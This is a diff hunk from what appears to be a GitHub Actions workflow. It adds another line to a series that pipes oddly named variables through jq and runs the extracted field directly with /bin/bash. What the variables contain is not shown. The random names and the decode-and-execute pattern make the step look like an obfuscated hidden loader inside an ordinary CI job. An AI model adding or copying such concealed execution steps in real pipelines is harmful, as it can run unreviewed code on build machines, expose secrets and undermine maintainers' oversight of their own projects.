@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$zuos46469" | jq -r .u3 | /bin/bash
           echo $a82 | jq -r .yalsz16 | /bin/bash
           echo $rcine98591 | jq -r .fiu26 | /bin/bash
+          printf '%s' "$nb0" | jq -r .dkh4 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
